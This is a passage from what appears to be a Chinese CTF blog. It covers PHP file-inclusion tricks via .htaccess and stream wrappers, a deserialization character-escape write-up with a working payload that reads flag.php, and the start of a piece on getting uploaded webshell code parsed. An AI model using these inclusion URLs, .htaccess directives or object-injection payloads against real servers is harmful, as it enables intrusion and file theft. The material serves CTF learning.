.htaccess文件中php_value 可以设置php.ini里的选项,并只在 .htaccess文件所在的文件夹下生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file  lexsd6.php</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64decode&#x2F;resource&#x3D;lexsd6.php&quot;</span><br></pre></td></tr></table></figure><p>故可以把代码入.htaccess文件中，再通过auto_prepend_file/auto_append_file包含。即：</p><p><img src="image-20200612215358056.png" alt="image-20200612215358056"></p><p>同时不仅可以通过.htaccess文件来改变open_basedir来让包含路径不受限制，还可以通过与include_path来改变包含路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value open_basedir   xxx1(允许的路径)</span><br><span class="line">php_value include_path   xxx2(包含路径)</span><br></pre></td></tr></table></figure><h2 id="0x04利用php协议进行包含"><a href="#0x04利用php协议进行包含" class="headerlink" title="0x04利用php协议进行包含"></a>0x04利用php协议进行包含</h2><p>在文件包含时可以通过php协议,来绕过一些限制从而进行包含.</p><p>PHP中支持的伪协议:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">*php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">*zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">*data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><p>大佬总结的图如下:</p><p><img src="image-20200606151558443.png" alt="image-20200606151558443"></p><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响.</p><p>用法: file:// [文件的绝对路径和文件名]</p><p>例： file://C:/phpstudy_pro/WWW/flag.php</p><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h4><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><p>(1)php://filter</p><p> php://filter与file://协议相似在双off的情况下也可以正常使用.</p><p>用法: php://filter/筛选过滤方式/resource=&lt;文件&gt;</p><p>例:php://filter/read=convert.base64-encode/resource=index.php</p><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>(2)php://input</p><p>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。<br>ps：enctype=”multipart/form-data” 或allow_url_include=off 的时候 php://input 是无效的。</p><p>用法：php://input  (post 方式提交php代码)</p><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><p>又称为RFC 2397 协议,data://协议在‘allow_url_fopen =on ’与v‘allow_url_include：on’<br>且php 版本大于等于 php5.2 才能生效。</p><p>用法 data://资源类型;编码,内容  （‘data://’也可以写成‘data:’）</p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h2 id="0x00参考资料"><a href="#0x00参考资料" class="headerlink" title="0x00参考资料"></a>0x00参考资料</h2><p><a href="https://www.php.net/manual/zh/ini.core.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.core.php</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于php反序列化字符逃逸的思考</title>
      <link href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>php反序列化字符逃逸：指序列化的字符串是受某函数的所谓过滤处理后，字符串的某一部分会变化但描述其长度的数字没有改变.导致PHP在按该数字读取相应长度字符串后，本来属于该字符串的内容逃逸出了成为反序列化的一个属性,并成功反序列化.</p><a id="more"></a><h3 id="0x01逃逸产生的原因"><a href="#0x01逃逸产生的原因" class="headerlink" title="0x01逃逸产生的原因"></a>0x01逃逸产生的原因</h3><p>1.PHP在类进行序列化时，对类中不存在的属性也会进行反序列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class c&#123;</span><br><span class="line">    public $c&#x3D;&#39;ccc&#39;;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new C;</span><br><span class="line">echo serialize($a);&#x2F;&#x2F;输出  O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;</span><br><span class="line"></span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出  C Object ( [c] &#x3D;&gt; C Object ( [c] &#x3D;&gt; ccc ) )</span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:2:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出C </span><br><span class="line">&#x2F;&#x2F;Object ( [c] &#x3D;&gt; ccc [b] &#x3D;&gt; C Object ( [c] &#x3D;&gt; ccc ) )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.PHP进行反序列化时，是以’;’ 作为字段的分隔，以 ‘}’作为结尾(字符串除外)，并且是根据长度判断内容的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> $b=<span class="string">'B'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'this is a long  date'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">';s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;'</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//得到的结果是：</span></span><br><span class="line"><span class="comment">//O:1:"A":2:&#123;s:1:"a";s:20:"this is a long date";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;</span></span><br><span class="line">$b=unserialize($a)</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出的是A Object ( [a] =&gt; this is a long date [b] =&gt; ;s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125; )</span></span><br></pre></td></tr></table></figure><p>可以看出<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;s:1:&quot;b&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}&quot;;}</code>反序列化出来的是一个A对象有值为‘this is a long date’的字符串属性a，和值为‘;s:1:”b”;O:1:”B”:1:{s:1:”b”;s:1:”B”;}}’字符串属性b。但如果有什么特殊的原因让反例化的值产生了变化,如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果有什么特殊的原因让反例化的值产生了变化如"this is a long date"中的'is a long date‘去掉</span></span><br><span class="line">$b=<span class="string">'O:1:"A":2:&#123;s:1:"a";s:20:"this ";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;'</span></span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出是A Object ( [a] =&gt; this ";s:1:"b";s:38: [b] =&gt; B Object ( [b] =&gt; B ) )</span></span><br><span class="line">this <span class="string">";s:1:"</span><span class="string">b";s:38:"</span>;s:<span class="number">1</span>:</span><br></pre></td></tr></table></figure><p>可以看出输出结果为一个名为A的对象有两个属性一个是值为‘’this ‘;s:1:”b”;s:38:’的字符串属性a，另一个名为B的对象(里有名为b值为B的字符串属性)。可见在我们将<code>s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;</code>中的”this is a long date”改成“this ”后，在反序列化，仍以20的字符串长度来反序化，同时刚好20个字符后双引号和;号，于是将”this “;s:1:”b”;s:38:”;s:1:b”当成一个字符串。同时剩下的<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}</code>被当成一个对象来反序列化出来，而最后的 <code>&quot;;}</code>被忽视掉。这样就逃逸出来一个B Object。</p><h3 id="0x02例题分析"><a href="#0x02例题分析" class="headerlink" title="0x02例题分析"></a>0x02例题分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;fget.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码发现首先发现有三个类A、B、C。仔细分析，发现class A 有用于实例化传值的<code>__construct</code>方法。再分析类发现class C里有提示可以通过<code>__toString()</code>里file_get_contents函数读取flag。在class B，中有一个<code>__destruct()</code>里有个echo可以用来触发。发现unserialize与serialize函数发现是反序列化与序列化操作，但只能对class A进行操作。</p><p>分析完代码后，我们发现我们要想的效果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br><span class="line">$c-&gt;c = <span class="string">"flag.php"</span>;</span><br><span class="line">$b-&gt;b = $c;</span><br><span class="line">$a-&gt;username = <span class="string">"1"</span>;</span><br><span class="line">$a-&gt;password = $b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>得到一个序列化的结果:</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><p>但一个正常的A的对象序列化的结果为：</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}</code></p><p>但我们可以通过php反序列化字符逃逸将<code>s:8:&quot;password&quot;;s:1:&quot;1&quot;;</code>替换为<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code>来达到我们想要的结果。</p><p>但再回到原码发现我们不是直接将序列化后的字符提交给unserialize函数。而是先将class A先实例出一个对象在将这个对象序列化，再经过write与read函数后，再提交给unserialize函数执行。我们分析write与read函数发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">    <span class="comment">//str_replace() 函数用法（要替换的字符，替换成的字符，要处理的字符串）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>比, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="comment">//'\0\0\0'比chr(0) . '*' . chr(0)多了3个字符长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们提交的数据中用‘\0\0\0’在执行read后就少了三字符。因此我们可以构造参数$a中有多个’\0\0\0’让他执行read后多出来的字符长度用来逃逸。让php编译器将<code>&quot;;s:8:&quot;password&quot;;s:60:&quot;2</code>是username的值。即<code>$a-&gt;username=“********&quot;;s:8:&quot;password&quot;;s:60:&quot;2&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">48</span>:<span class="string">"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">74</span>:<span class="string">"2"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;O:<span class="number">1</span>:<span class="string">"B"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"b"</span>;O:<span class="number">1</span>:<span class="string">"C"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;&#125;&#125;<span class="string">";&#125;</span></span><br><span class="line"><span class="string">//得到--〉</span></span><br><span class="line"><span class="string">O:1:"</span>A<span class="string">":2:&#123;s:8:"</span>username<span class="string">";s:24:"</span>********<span class="string">";s:8:"</span>password<span class="string">";s:60:"</span><span class="number">2</span><span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;"</span>;&#125;<span class="comment">//*号附近两边有看不见的chr(0)</span></span><br></pre></td></tr></table></figure><p>所以构造payload：</p><p><code>a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=2&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><h3 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h3><p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</a></p><p><a href="https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/" target="_blank" rel="noopener">https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让文件里PHP代码被服务器解析执行</title>
      <link href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>按照一般植入webshell的方法通常是上传一段包含恶意代码文件，然后让服务器解析文件里的恶意代码从而得到get shell的目的。那么问题来了,文件中什么的字符会被当成php代码来解析？PHP代码中指令怎么分割？什么样的文件服务器会去解析？(本文章默认要执行的文件已在网站目录下的情况)</p><a id="more"></a><h2 id="0x01PHP代码的特征"><a href="#0x01PHP代码的特征" class="headerlink" title="0x01PHP代码的特征"></a>0x01PHP代码的特征</h2><p>当然一个文件被php解析时不会全部都拿去执行，而是将具有php代码特征的部分拿去执行。而那特征就是php的开始与结束标记。</p><p>按照官方的说法：PHP解析器当解析一个文件时，PHP 会寻找起始和结束标记，这告诉 PHP 二者标记之间的是要解析的php代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p><p>在官方文档中，给我们提供以下几种php起始和结束标记：</p><h3 id="1-’-lt-php’-与’-gt-‘"><a href="#1-’-lt-php’-与’-gt-‘" class="headerlink" title="(1)’&lt; ?php’ 与’? &gt;‘"></a>(1)’&lt; ?php’ 与’? &gt;‘</h3><p>这种标记用法是最常见的用法，也被称为长标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">#起始标记,php可以大小写混用</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'this is php code'</span>;<span class="comment">#php代码部分</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#结束标记</span></span><br></pre></td></tr></table></figure><h3 id="2-lt-script-gt-标签标记"><a href="#2-lt-script-gt-标签标记" class="headerlink" title="(2)&lt;script&gt;标签标记"></a>(2)&lt;script&gt;标签标记</h3><p>用script标签来标记php代码,使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;#php可以大小写混用</span><br><span class="line">        echo &#39;this is php code by script&#39;;#php代码部分</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>注意的是在php 7.0.0 版本后，，默认不支持这种写法。</p><h3 id="3-ASP-风格标记"><a href="#3-ASP-风格标记" class="headerlink" title="(3)ASP 风格标记"></a>(3)ASP 风格标记</h3><p>用&lt;%%&gt;来标记php,如要使用此种标记要php.ini 配置文件中的指令 asp_tags=On后才可用。 但要注意的是在7.0.0后的版本里移除了asp_tags.</p><p>具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;标记用法：</span><br><span class="line">&lt;%  echo &#39;this is php code by ASP&#39;; %&gt;</span><br><span class="line">&lt;% %&gt;格式的 echo 标记用法：</span><br><span class="line">&lt;%&#x3D;&#39;text&#39;; %&gt;#类似&lt;% echo &#39;echo&#39;;%&gt;</span><br></pre></td></tr></table></figure><h3 id="4-使用短标签来标记"><a href="#4-使用短标签来标记" class="headerlink" title="(4)使用短标签来标记"></a>(4)使用短标签来标记</h3><p>短标记（&lt;? ?&gt;）仅在通过 php.ini 配置文件中的指令 short_open_tag =On后才可用，或者在 PHP 编译时加入了 –enable-short-tags 选项.具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo&#39;this is php code by ASP&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>同时这种标签也有 echo 标记 ‘&lt;?=’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#39;text&#39;; ?&gt;#等价&lt;? echo &#39;echo&#39;;?&gt;的使用方式</span><br></pre></td></tr></table></figure><p>注意的是：PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</p><h2 id="0x02如何分割PHP代码指令"><a href="#0x02如何分割PHP代码指令" class="headerlink" title="0x02如何分割PHP代码指令"></a>0x02如何分割PHP代码指令</h2><p>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;单行代码可以省略;</span><br><span class="line">&lt;?php</span><br><span class="line">  echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;多行代码，1句代码后要加;号,最后一行可以不用分号结束</span><br><span class="line">&lt;?php</span><br><span class="line">      echo &#39;this one commod&#39;;</span><br><span class="line">      echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>除了用；号分割外，也可以用php标记来分隔：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a&#x3D;&#39;this a code&#39;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?&#x3D;$a ?&gt;</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img src="image-20200515224849956.png" alt=""></p><h2 id="0x03让文件被服务器解析"><a href="#0x03让文件被服务器解析" class="headerlink" title="0x03让文件被服务器解析"></a>0x03让文件被服务器解析</h2><p>我们一般在初学php时，一般都是用phpstudy 或者Wampserver 来一件搭建php环境的。但在搭建后，就会发现一个问题。只有后缀名为php的文件里面的php代码被执行了,而其他后缀名的文件就算里面有php特征标记的php代码也没有被执行。</p><p><img src="image-20200517152606197.png" alt="image-20200517152606197"></p><p><img src="image-20200517152713360.png" 